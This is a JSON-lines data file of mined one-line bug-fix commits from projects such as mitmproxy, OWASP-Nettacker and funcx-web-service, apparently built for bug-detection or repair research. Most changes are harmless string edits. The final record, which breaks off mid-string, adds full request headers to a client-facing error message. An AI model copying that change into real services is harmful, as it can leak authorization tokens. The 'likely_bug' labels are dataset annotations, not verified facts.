{"project": "py-zabbix", "commit_sha": "41c7027e5cfe15b86421b0c5282a39f8beb67aa4", "parent_sha": "cce549fde985f26efa472c5c5774fda98f3b29ea", "file_path": "tests/test_Functional_API.py", "project_url": "https://github.com/kingleoric2010/py-zabbix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class FunctionalAPI(TestCase):\n \n     def test_LoginToServerSSL(self):\n         try:\n-            ZabbixAPI(url='http://127.0.0.1',\n+            ZabbixAPI(url='https://127.0.0.1',\n                       user='Admin',\n                       password='zabbix')\n         except ZabbixAPIException:\n", "before": "ZabbixAPI ( url = 'http://127.0.0.1' , user = 'Admin' , password = 'zabbix' )", "after": "ZabbixAPI ( url = 'https://127.0.0.1' , user = 'Admin' , password = 'zabbix' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'http://127.0.0.1'\", 3, 27, 3, 45], \"'https://127.0.0.1'\"]]"}
{"project": "storj_node_query", "commit_sha": "2c5a527d916a623122991d08388f21b8c80896a7", "parent_sha": "fe6c319658cbd6011c6c82124e2f7d80fb1879d7", "file_path": "storj_query.py", "project_url": "https://github.com/funtimes-ninja/storj_node_query", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ def print_format(data):\n     elif compare_time(data['time_stamp']) == 6:\n         Color.yellow(\" {:<19s}\".format(data['time_stamp']), end=\"\")\n     else:\n-        Color.red(\"{:<19s} \".format(data['time_stamp']), end=\"\")\n+        Color.red(\" {:<19s} \".format(data['time_stamp']), end=\"\")\n     print(\" {:<4s} \".format(data['rep']), end=\"\")\n     print(\" {:<19s} \".format(data['response']), end=\"\")\n     try:\n", "before": "else : Color . red ( \"{:<19s} \" . format ( data [ 'time_stamp' ] ) , end = \"\" )", "after": "else : Color . red ( \" {:<19s} \" . format ( data [ 'time_stamp' ] ) , end = \"\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"{:<19s} \\\"\", 3, 19, 3, 29], \"\\\" {:<19s} \\\"\"]]"}
{"project": "dataengineeringutils", "commit_sha": "bcc6d3d2c82007837459434356a2274eeef49edf", "parent_sha": "8ca5079f3efde1e9d27376da922abc0923488a96", "file_path": "dataengineeringutils/meta.py", "project_url": "https://github.com/moj-analytical-services/dataengineeringutils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class Meta :\n             self.meta['columns'].append({\n                 'name' : column_name,\n                 'type' : column_type,\n-                'desc' : column_desc\n+                'description' : column_desc\n             })\n             self.__update_column_names()\n \n", "before": "self . meta [ 'columns' ] . append ( { 'name' : column_name , 'type' : column_type , 'desc' : column_desc } )", "after": "self . meta [ 'columns' ] . append ( { 'name' : column_name , 'type' : column_type , 'description' : column_desc } )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'desc'\", 3, 17, 3, 23], \"'description'\"]]"}
{"project": "OWASP-Nettacker", "commit_sha": "b181e7a04ffdecc0b49a89c959b57f913269e34c", "parent_sha": "1d5cfd3877efaebe196f58925370c91041c812fe", "file_path": "core/args_loader.py", "project_url": "https://github.com/susantaroy2002/OWASP-Nettacker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ def load_all_args(module_names):\n         try:\n             index = sys.argv.index(\"-L\") + 1\n         except:\n-            index = sys.argv.index(\"-language\") + 1\n+            index = sys.argv.index(\"--language\") + 1\n     else:\n         index = -1\n     if index is -1:\n", "before": "index = sys . argv . index ( \"-language\" ) + 1", "after": "index = sys . argv . index ( \"--language\" ) + 1", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"-language\\\"\", 3, 36, 3, 47], \"\\\"--language\\\"\"]]"}
{"project": "OWASP-Nettacker", "commit_sha": "7ba0aaa23c0ff3af10fc86a07ffb03db2d53b469", "parent_sha": "49aef207bba2b31dc183f847694c8d35a95beece", "file_path": "core/args_loader.py", "project_url": "https://github.com/susantaroy2002/OWASP-Nettacker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ def load_all_args(module_names):\n                          default=False, dest=\"check_update\",\n                          help=messages(language, 61))\n     engineOpt.add_option(\"-o\", \"--output\", action=\"store\",\n-                         default=\"results.txt\", dest=\"log_in_file\",\n+                         default=\"results.html\", dest=\"log_in_file\",\n                          help=messages(language, 11))\n     engineOpt.add_option(\"--graph\", action=\"store\",\n                          default=False, dest=\"graph_flag\",\n", "before": "help = messages ( language , 61 ) ) engineOpt . add_option ( \"-o\" , \"--output\" , action = \"store\" , default = \"results.txt\" , dest = \"log_in_file\" , help = messages ( language , 11 ) )", "after": "help = messages ( language , 61 ) ) engineOpt . add_option ( \"-o\" , \"--output\" , action = \"store\" , default = \"results.html\" , dest = \"log_in_file\" , help = messages ( language , 11 ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"results.txt\\\"\", 3, 34, 3, 47], \"\\\"results.html\\\"\"]]"}
{"project": "OWASP-Nettacker", "commit_sha": "99c6436c243acd4f66db9f92e5626365ee65f35a", "parent_sha": "13ab0728f81706b7953eb691f1b4190d070b13e0", "file_path": "core/languages.py", "project_url": "https://github.com/susantaroy2002/OWASP-Nettacker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -770,7 +770,7 @@ def all_messages():\n                 \"id\": \"tidak bisa membaca file {0}\",\n                 \"de\": \"kann die Datei {0} nicht lesen\",\n                 \"tr\": \"{0} dosyas\u0131 okunam\u0131yor\",\n-                \"ps\": \"\u062f \u062f\u0648\u062a\u0646\u0647 \u0641\u0627\u06cc\u0644 \u0646\u0647 \u0634\u06cc \u06a9\u0648\u0644\u06cc\",\n+                \"ps\": \"\u062f \u062f\u0648\u062a\u0646\u0647 \u0641\u0627\u06cc\u0644 \u0646\u0647 \u0634\u06cc \u06a9\u0648\u0644\u06cc {0}\",\n                 \"ur\": \"\u0641\u0627\u0626\u0644 {0} \u0646\u06c1\u06cc\u06ba \u067e\u0691\u06be \u0633\u06a9\u062a\u06cc\",\n                 \"fa\": \"\u0639\u062f\u0645 \u062a\u0648\u0627\u0646\u0627\u06cc\u06cc \u062f\u0631 \u062e\u0648\u0627\u0646\u062f\u0646 \u0641\u0627\u06cc\u0644 {0}\",\n                 \"hy\": \"{0} \u0586\u0561\u0575\u056c\u0568 \u0579\u056b \u200b\u200b\u056f\u0561\u0580\u0578\u0572 \u0568\u0576\u0569\u0565\u0580\u0581\u0565\u056c\",\n", "before": "\"ps\" : \"\u062f \u062f\u0648\u062a\u0646\u0647 \u0641\u0627\u06cc\u0644 \u0646\u0647 \u0634\u06cc \u06a9\u0648\u0644\u06cc\", ", "after": "\"ps\" : \"\u062f \u062f\u0648\u062a\u0646\u0647 \u0641\u0627\u06cc\u0644 \u0646\u0647 \u0634\u06cc \u06a9\u0648\u0644\u06cc {0}\", ", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"\\u062f \\u062f\\u0648\\u062a\\u0646\\u0647 \\u0641\\u0627\\u06cc\\u0644 \\u0646\\u0647 \\u0634\\u06cc \\u06a9\\u0648\\u0644\\u06cc\\\",\", 3, 23, 3, 66], \"\\\"\\u062f \\u062f\\u0648\\u062a\\u0646\\u0647 \\u0641\\u0627\\u06cc\\u0644 \\u0646\\u0647 \\u0634\\u06cc \\u06a9\\u0648\\u0644\\u06cc {0}\\\",\"]]"}
{"project": "auto-sklearn", "commit_sha": "5891a9557d68f28bf68f13c8ad3397b57f028ced", "parent_sha": "685e4111f801b2a2e200efde5ca88f22bcdb54f9", "file_path": "test/test_pipeline/test_classification.py", "project_url": "https://github.com/faisalomar/auto-sklearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -575,7 +575,7 @@ class SimpleClassificationPipelineTest(unittest.TestCase):\n         cs = SimpleClassificationPipeline.get_hyperparameter_search_space(\n             include={'preprocessor': ['nystroem_sampler']})\n         self.assertEqual(cs.get_hyperparameter('classifier:__choice__').default,\n-                         'xgradient_boosting')\n+                         'sgd')\n \n     def test_get_hyperparameter_search_space_only_forbidden_combinations(self):\n         self.assertRaisesRegexp(AssertionError, \"No valid pipeline found.\",\n", "before": "self . assertEqual ( cs . get_hyperparameter ( 'classifier:__choice__' ) . default , 'xgradient_boosting' )", "after": "self . assertEqual ( cs . get_hyperparameter ( 'classifier:__choice__' ) . default , 'sgd' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'xgradient_boosting'\", 3, 26, 3, 46], \"'sgd'\"]]"}
{"project": "dspdemo", "commit_sha": "ad215921e6cbefdb32a536d3bcc78eb5d9f9e198", "parent_sha": "04361ece1693bee1eac9d78a5972645b97aa831e", "file_path": "Resources/utils.py", "project_url": "https://github.com/belangeo/dspdemo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def audio_config():\n \n     if host is None:\n         if sys.platform.startswith(\"win\"):\n-            host = \"wasapi\"\n+            host = \"directsound\"\n         elif sys.platform.startswith(\"linux\"):\n             host = \"alsa\"\n         else:\n", "before": "host = \"wasapi\"", "after": "host = \"directsound\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"wasapi\\\"\", 3, 20, 3, 28], \"\\\"directsound\\\"\"]]"}
{"project": "yasso07ui", "commit_sha": "55a48ffafb68e67e218615542f101dc9534c34d3", "parent_sha": "11a0ca5f1821f40873eeabf9d2d6c90bcf7ed1a9", "file_path": "yasso.py", "project_url": "https://github.com/JariLiski/yasso07ui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -559,7 +559,7 @@ class Yasso(HasTraits):\n         fn = os.path.split(sys.executable)\n         if fn[1].lower().startswith('python'):\n             exedir = os.path.split(sys.argv[0])[0]\n-            self.data_file = join(os.path.abspath(exedir), 'demo_input.txt')\n+            self.data_file = join(os.path.abspath(exedir), 'demo_data.txt')\n             parfile = join(os.path.abspath(exedir), 'yasso_param.dat')\n         else:\n             self.data_file = join(fn[0], 'demo_input.txt')\n", "before": "self . data_file = join ( os . path . abspath ( exedir ) , 'demo_input.txt' )", "after": "self . data_file = join ( os . path . abspath ( exedir ) , 'demo_data.txt' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'demo_input.txt'\", 3, 60, 3, 76], \"'demo_data.txt'\"]]"}
{"project": "yasso07ui", "commit_sha": "619d7e9788aeac0d8525c60749d44920c1c03394", "parent_sha": "55a48ffafb68e67e218615542f101dc9534c34d3", "file_path": "yasso.py", "project_url": "https://github.com/JariLiski/yasso07ui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -562,7 +562,7 @@ class Yasso(HasTraits):\n             self.data_file = join(os.path.abspath(exedir), 'demo_data.txt')\n             parfile = join(os.path.abspath(exedir), 'yasso_param.dat')\n         else:\n-            self.data_file = join(fn[0], 'demo_input.txt')\n+            self.data_file = join(fn[0], 'demo_data.txt')\n             parfile = join(fn[0], 'yasso_param.dat')\n         try:\n             f = open(self.data_file)\n", "before": "else : self . data_file = join ( fn [ 0 ] , 'demo_input.txt' )", "after": "else : self . data_file = join ( fn [ 0 ] , 'demo_data.txt' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'demo_input.txt'\", 3, 42, 3, 58], \"'demo_data.txt'\"]]"}
{"project": "SlicerCamera", "commit_sha": "a01d003b72213d1c70fec2c18f11cadb9d07a66e", "parent_sha": "3cba8cb746da5fcabdd8c3157948249028ed7be7", "file_path": "VideoCameraCalibration/VideoCameraCalibration.py", "project_url": "https://github.com/VASST/SlicerCamera", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -186,7 +186,7 @@ class VideoCameraCalibrationWidget(ScriptedLoadableModuleWidget):\n       self.resetPtLButton = VideoCameraCalibrationWidget.get(self.widget, \"pushButton_resetPtL\")\n       self.trackerResultsLabel = VideoCameraCalibrationWidget.get(self.widget, \"label_TrackerResultsValue\")\n       self.captureCountSpinBox = VideoCameraCalibrationWidget.get(self.widget, \"spinBox_captureCount\")\n-      self.stylusTipTransformStatusLabel = VideoCameraCalibrationWidget.get(self.widget, \"label_StylusTipToVideoCamera_Status\")\n+      self.stylusTipTransformStatusLabel = VideoCameraCalibrationWidget.get(self.widget, \"label_StylusTipToCamera_Status\")\n \n       # Intrinsic calibration members\n       self.capIntrinsicButton = VideoCameraCalibrationWidget.get(self.widget, \"pushButton_CaptureIntrinsic\")\n", "before": "self . stylusTipTransformStatusLabel = VideoCameraCalibrationWidget . get ( self . widget , \"label_StylusTipToVideoCamera_Status\" )", "after": "self . stylusTipTransformStatusLabel = VideoCameraCalibrationWidget . get ( self . widget , \"label_StylusTipToCamera_Status\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"label_StylusTipToVideoCamera_Status\\\"\", 3, 90, 3, 127], \"\\\"label_StylusTipToCamera_Status\\\"\"]]"}
{"project": "athlessary", "commit_sha": "d1e825c0afeebef8ccfe348b754937148537d669", "parent_sha": "eb43b336a862406bd310ba956c98b36d1a029a09", "file_path": "Utils/db.py", "project_url": "https://github.com/SubSixSolutions/athlessary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ class Database:\n \n         cur.execute(sql)\n \n-        cur.execute(\"DROP TRIGGER IF EXISTS delete_user on users;\")\n+        cur.execute(\"DROP TRIGGER IF EXISTS delete_user on profile;\")\n \n", "before": "cur . execute ( \"DROP TRIGGER IF EXISTS delete_user on users;\" )", "after": "cur . execute ( \"DROP TRIGGER IF EXISTS delete_user on profile;\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"DROP TRIGGER IF EXISTS delete_user on users;\\\"\", 3, 21, 3, 67], \"\\\"DROP TRIGGER IF EXISTS delete_user on profile;\\\"\"]]"}
{"project": "vm-automation", "commit_sha": "a4abe947821eb75601bed39f7ac61b17d3ef1326", "parent_sha": "ab89f1157bc2831d938c199720eee2ca4e45c375", "file_path": "samples/set_vm_network.py", "project_url": "https://github.com/Acidburn0zzz/vm-automation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ def get_vm_server(config_file):\n         with open(config_file) as config_file_handle:\n             config_map = json.load(config_file_handle)\n             if config_map['HYPERVISOR_TYPE'].lower() == \"esxi\":\n-                vmServer = vm_automation.esxiServer.createFromConfig(config_map, 'esxi_autoamtion.log')\n+                vmServer = vm_automation.esxiServer.createFromConfig(config_map, 'esxi_automation.log')\n                 vmServer.connect()\n             if config_map['HYPERVISOR_TYPE'].lower() == \"workstation\":\n                 vmServer = vm_automation.workstationServer(config_map, 'workstation_automation.log')\n", "before": "vmServer = vm_automation . esxiServer . createFromConfig ( config_map , 'esxi_autoamtion.log' )", "after": "vmServer = vm_automation . esxiServer . createFromConfig ( config_map , 'esxi_automation.log' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'esxi_autoamtion.log'\", 3, 82, 3, 103], \"'esxi_automation.log'\"]]"}
{"project": "litex-buildenv", "commit_sha": "b040d1bb1d87f71a10f731c3afcce758be7808c4", "parent_sha": "2b8e200ffd97da6f7ff74079a83b45668cc6bd31", "file_path": "gateware/streamer/__init__.py", "project_url": "https://github.com/jimmo/litex-buildenv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class USBStreamer(Module):\n         ]\n \n         self.submodules.fifo = fifo = RenameClockDomains(AsyncFIFO([(\"data\", 8)], 4),\n-                                          {\"write\": \"sys\", \"read\": \"usb\"})\n+                                          {\"write\": \"encoder\", \"read\": \"usb\"})\n         self.comb += Record.connect(sink, fifo.sink)\n \n \n", "before": "self . submodules . fifo = fifo = RenameClockDomains ( AsyncFIFO ( [ ( \"data\" , 8 ) ] , 4 ) , { \"write\" : \"sys\" , \"read\" : \"usb\" } )", "after": "self . submodules . fifo = fifo = RenameClockDomains ( AsyncFIFO ( [ ( \"data\" , 8 ) ] , 4 ) , { \"write\" : \"encoder\" , \"read\" : \"usb\" } )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"sys\\\"\", 3, 53, 3, 58], \"\\\"encoder\\\"\"]]"}
{"project": "litex-buildenv", "commit_sha": "b4987a4c4323c2b846aef5918e0467f254a55941", "parent_sha": "b0a961341bff96d2a0cec7442a1880a438c3ad5e", "file_path": "platforms/atlys.py", "project_url": "https://github.com/jimmo/litex-buildenv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -634,7 +634,7 @@ class Platform(XilinxPlatform):\n     gateware_size = 0x200000\n \n \n-    def __init__(self, programmer=\"openocd\", vccb2_voltage=\"VCC2V5\"):\n+    def __init__(self, programmer=\"openocd\", vccb2_voltage=\"VCC3V3\"):\n \t# Resolve the LVCMOS_BANK2 voltage level before anything uses the _io\n \t# definition.\n         LVCMOS_BANK2.set(vccb2_voltage)\n", "before": "def __init__ ( self , programmer = \"openocd\" , vccb2_voltage = \"VCC2V5\" ) : LVCMOS_BANK2 . set ( vccb2_voltage )", "after": "def __init__ ( self , programmer = \"openocd\" , vccb2_voltage = \"VCC3V3\" ) : LVCMOS_BANK2 . set ( vccb2_voltage )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"VCC2V5\\\"\", 3, 60, 3, 68], \"\\\"VCC3V3\\\"\"]]"}
{"project": "echronos-sandbox", "commit_sha": "ae4990c8551fe3db00b24f84620c00c656b5c4b1", "parent_sha": "e566cad4e85ebcb95fc36fb4df9fed35f1783654", "file_path": "packages/stub/build.py", "project_url": "https://github.com/schnommus/echronos-sandbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,5 +48,5 @@ def system_build(system, configuration):\n \n     shared_args = ['-shared', '-fPIC'] if configuration['output_type'] == 'shared-library' else []\n \n-    execute('gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -o'.split() +\n+    execute('gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -Wextra -o'.split() +\n             [system.output_file] + shared_args + inc_path_args + system.c_files)\n", "before": "execute ( 'gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -o' . split ( ) + [ system . output_file ] + shared_args + inc_path_args + system . c_files )", "after": "execute ( 'gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -Wextra -o' . split ( ) + [ system . output_file ] + shared_args + inc_path_args + system . c_files )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -o'\", 3, 13, 3, 80], \"'gcc -std=c90 -Werror -Wall --all-warnings -Wpedantic -pedantic -Wextra -o'\"]]"}
{"project": "echronos-sandbox", "commit_sha": "5356b22b4e212df70374f8ffed46416ee12f8bd4", "parent_sha": "80ee6e06bcae72d163b90e95920981d258ccc2a0", "file_path": "packages/armv7m/vectable.py", "project_url": "https://github.com/schnommus/echronos-sandbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class EntryModule(Module):\n                 try:\n                     p.parse(f.read(), c_file)\n                 except ply.cpp.CppError as e:\n-                    err_s = \"Could not parse source files whilst performing bitband macro replacement. Error was: \"\n+                    err_s = \"Could not parse source file during bitband macro replacement. Error was: \"\n                     raise SystemBuildError(err_s + str(e))\n \n         super().post_prepare(system, config)\n", "before": "err_s = \"Could not parse source files whilst performing bitband macro replacement. Error was: \"", "after": "err_s = \"Could not parse source file during bitband macro replacement. Error was: \"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Could not parse source files whilst performing bitband macro replacement. Error was: \\\"\", 3, 29, 3, 116], \"\\\"Could not parse source file during bitband macro replacement. Error was: \\\"\"]]"}
{"project": "ottertune", "commit_sha": "af4181c5bf7afa0977b1112660093edd6a31c86b", "parent_sha": "d40d78fb0d0b65b10e18ef5726706926a0ae83ab", "file_path": "client/driver/fabfile.py", "project_url": "https://github.com/master-MR-han/ottertune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -114,7 +114,7 @@ def run_oltpbench_bg():\n \n @task\n def run_controller():\n-    cmd = 'sudo gradle run -PappArgs=\"-c config/sample_postgres_config.json --no-daemon\"'\n+    cmd = 'sudo gradle run -PappArgs=\"-c config/sample_postgres_config.json\" --no-daemon'\n     with lcd(\"../controller\"):  # pylint: disable=not-context-manager\n         local(cmd)\n \n", "before": "cmd = 'sudo gradle run -PappArgs=\"-c config/sample_postgres_config.json --no-daemon\"'", "after": "cmd = 'sudo gradle run -PappArgs=\"-c config/sample_postgres_config.json\" --no-daemon'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'sudo gradle run -PappArgs=\\\"-c config/sample_postgres_config.json --no-daemon\\\"'\", 3, 11, 3, 90], \"'sudo gradle run -PappArgs=\\\"-c config/sample_postgres_config.json\\\" --no-daemon'\"]]"}
{"project": "fitbit-googlefit", "commit_sha": "20e6a1a9441d16bdac162582bbd770b23495afee", "parent_sha": "dabaa8c37c814e57aef714681542081dc349ef4b", "file_path": "remote.py", "project_url": "https://github.com/lightmaster/fitbit-googlefit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -232,7 +232,7 @@ class Remote:\n \t\t\t\tdatetime.datetime.fromtimestamp(min(startTimeMillis)/1000).strftime('%Y-%m-%d'),\n \t\t\t\tdatetime.datetime.fromtimestamp(max(endTimeMillis)/1000).strftime('%Y-%m-%d')) )\n \t\telse:\n-\t\t\tprint(\"No activities found after {}\".format(start_date))\n+\t\t\tprint(\"No Fitbit activities logged since {}\".format(start_date))\n \n \t\tif activities_raw['pagination']['next'] != '':\n \t\t \tself.SyncFitbitActivitiesToGoogleFit(dataSourceId, callurl=activities_raw['pagination']['next'])\n", "before": "print ( \"No activities found after {}\" . format ( start_date ) )", "after": "print ( \"No Fitbit activities logged since {}\" . format ( start_date ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"No activities found after {}\\\"\", 3, 10, 3, 40], \"\\\"No Fitbit activities logged since {}\\\"\"]]"}
{"project": "mitmproxy", "commit_sha": "be9438b01ce5d925c8aa8738cf0d3c74e990329e", "parent_sha": "8cd0c9c3303cc50c980636b677ef4fcc1afb2b40", "file_path": "test/mitmproxy/script/test_script.py", "project_url": "https://github.com/aisier/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class TestParseCommand:\n     @tutils.skip_not_windows\n     def test_parse_windows(self):\n         with tutils.chdir(tutils.test_data.dirname):\n-            assert Script.parse_command(\"data\\\\scripts\\\\a.py\") == [\"scripts\\\\a.py\"]\n+            assert Script.parse_command(\"data\\\\scripts\\\\a.py\") == [\"data\\\\scripts\\\\a.py\"]\n             assert Script.parse_command(\"data\\\\scripts\\\\a.py 'foo \\\\ bar'\") == [\"data\\\\scripts\\\\a.py\", 'foo \\\\ bar']\n \n \n", "before": "assert Script . parse_command ( \"data\\\\scripts\\\\a.py\" ) == [ \"scripts\\\\a.py\" ]", "after": "assert Script . parse_command ( \"data\\\\scripts\\\\a.py\" ) == [ \"data\\\\scripts\\\\a.py\" ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"scripts\\\\\\\\a.py\\\"\", 3, 68, 3, 83], \"\\\"data\\\\\\\\scripts\\\\\\\\a.py\\\"\"]]"}
{"project": "mitmproxy", "commit_sha": "776f0a96693165896bee6251ede42ed642d064bb", "parent_sha": "1076c25e5b292b9c655e5acc3c587d06fe90b4c4", "file_path": "libmproxy/script.py", "project_url": "https://github.com/aisier/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class Script:\n         if not os.path.exists(args[0]):\n             raise ScriptError(\n                 (\"Script file not found: %s.\\r\\n\"\n-                 \"If you script path contains spaces, \"\n+                 \"If your script path contains spaces, \"\n                  \"make sure to wrap it in additional quotes, e.g. -s \\\"'./foo bar/baz.py' --args\\\".\") %\n                 args[0])\n         elif not os.path.isfile(args[0]):\n", "before": "raise ScriptError ( ( \"Script file not found: %s.\\r\\n\" \"If you script path contains spaces, \" \"make sure to wrap it in additional quotes, e.g. -s \\\"'./foo bar/baz.py' --args\\\".\" ) % args [ 0 ] )", "after": "raise ScriptError ( ( \"Script file not found: %s.\\r\\n\" \"If your script path contains spaces, \" \"make sure to wrap it in additional quotes, e.g. -s \\\"'./foo bar/baz.py' --args\\\".\" ) % args [ 0 ] )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"If you script path contains spaces, \\\"\", 3, 18, 3, 56], \"\\\"If your script path contains spaces, \\\"\"]]"}
{"project": "mitmproxy", "commit_sha": "170568ded048537418980f197bd31819c76de924", "parent_sha": "cacf767b5ce59489038c16410c78802efc3b8b62", "file_path": "libmproxy/console/window.py", "project_url": "https://github.com/aisier/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ class Window(urwid.Frame):\n         if not k:\n             if args[1] == \"mouse drag\":\n                 signals.status_message.send(\n-                    message = \"Hold down alt or ctrl to select text.\",\n+                    message = \"Hold down shift, alt or ctrl to select text.\",\n                     expire = 1\n                 )\n             elif args[1] == \"mouse press\" and args[2] == 4:\n", "before": "signals . status_message . send ( message = \"Hold down alt or ctrl to select text.\" , expire = 1 )", "after": "signals . status_message . send ( message = \"Hold down shift, alt or ctrl to select text.\" , expire = 1 )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Hold down alt or ctrl to select text.\\\"\", 3, 31, 3, 70], \"\\\"Hold down shift, alt or ctrl to select text.\\\"\"]]"}
{"project": "autogamess", "commit_sha": "188bbd910c4dd5909cf3701d05b7c9166b3824c8", "parent_sha": "80f2053c50317797f64a054bfd73394c66b3789f", "file_path": "autogamess/opt2hes.py", "project_url": "https://github.com/Cavenfish/autogamess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def opt2hes(optfile, logfile):\n     for i in np.arange(0, n, 1):\n \n         #Define key/value for atomdict\n-        key   = coords[i].split('   ')[0] #ugly\n+        key   = coords[i].split('.0')[0] \n         value = coords[i]\n \n         #Fill dictionary\n", "before": "key = coords [ i ] . split ( '   ' ) [ 0 ]", "after": "key = coords [ i ] . split ( '.0' ) [ 0 ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'   '\", 3, 33, 3, 38], \"'.0'\"]]"}
{"project": "mitmproxy", "commit_sha": "18a8834209b7cf447a669612ac09b7f90c8c209a", "parent_sha": "2aecffd39abb41c500573d823f0a05b1f7522041", "file_path": "mitmproxy/tools/console/flowview.py", "project_url": "https://github.com/aisier/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -681,7 +681,7 @@ class FlowView(tabs.Tabs):\n         encoding_map = {\n             \"z\": \"gzip\",\n             \"d\": \"deflate\",\n-            \"b\": \"brotli\",\n+            \"b\": \"br\",\n         }\n         conn.encode(encoding_map[key])\n         signals.flow_change.send(self, flow = self.flow)\n", "before": "encoding_map = { \"z\" : \"gzip\" , \"d\" : \"deflate\" , \"b\" : \"brotli\" , }", "after": "encoding_map = { \"z\" : \"gzip\" , \"d\" : \"deflate\" , \"b\" : \"br\" , }", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"brotli\\\"\", 3, 18, 3, 26], \"\\\"br\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "296d04312405d377db9aa57259de8c841b3d0bb0", "parent_sha": "15bfe95769543d4432583ff428b7304d5a7c8b9c", "file_path": "api/api.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ def status(task_id):\n         token_cache.update({token: user_name})\n \n     if not user_name:\n-        abort(400, description=\"Error: You must be logged in to perform this function.\")\n+        abort(400, description=\"Error: Could not find user. You must be logged in to perform this function.\")\n \n     try:\n         # Get a redis client\n", "before": "abort ( 400 , description = \"Error: You must be logged in to perform this function.\" )", "after": "abort ( 400 , description = \"Error: Could not find user. You must be logged in to perform this function.\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Error: You must be logged in to perform this function.\\\"\", 3, 32, 3, 88], \"\\\"Error: Could not find user. You must be logged in to perform this function.\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "ebc8378b553d47cbc62fa338a5e358fccf0579c9", "parent_sha": "296d04312405d377db9aa57259de8c841b3d0bb0", "file_path": "api/api.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def execute():\n         token = request.headers.get('Authorization')\n         token = token.split(\" \")[1]\n     else:\n-        abort(400, description=f\"Error: You must be logged in to perform this function. {token}\")\n+        abort(400, description=f\"Error: You must be logged in to perform this function. {token} , {request.headers}\")\n \n     if caching and token in token_cache:\n         user_id, user_name, short_name = token_cache[token]\n", "before": "else : abort ( 400 , description = f\"Error: You must be logged in to perform this function. {token}\" )", "after": "else : abort ( 400 , description = f\"Error: You must be logged in to perform this function. 